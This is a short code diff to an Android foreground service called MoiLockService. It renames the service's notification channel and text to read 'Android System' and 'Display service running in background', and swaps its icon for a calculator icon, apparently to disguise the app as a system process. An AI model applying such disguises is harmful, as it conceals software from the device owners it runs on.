@@ -33,19 +33,19 @@ class MoiLockService : Service() {
         
         // Start Foreground to ensure it stays alive
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channelId = "moilock_service_channel"
+            val channelId = "system_display_service_channel"
             val channel = NotificationChannel(
                 channelId,
-                "MoiLock Background Service",
+                "System Display Service",
                 NotificationManager.IMPORTANCE_MIN
             )
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             manager.createNotificationChannel(channel)
 
             val notification = NotificationCompat.Builder(this, channelId)
-                .setContentTitle("MoiLock")
-                .setContentText("Lock screen identity active")
-                .setSmallIcon(android.R.drawable.ic_secure)
+                .setContentTitle("Android System")
+                .setContentText("Display service running in background")
+                .setSmallIcon(R.drawable.ic_app_icon_calculator)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .build()
 
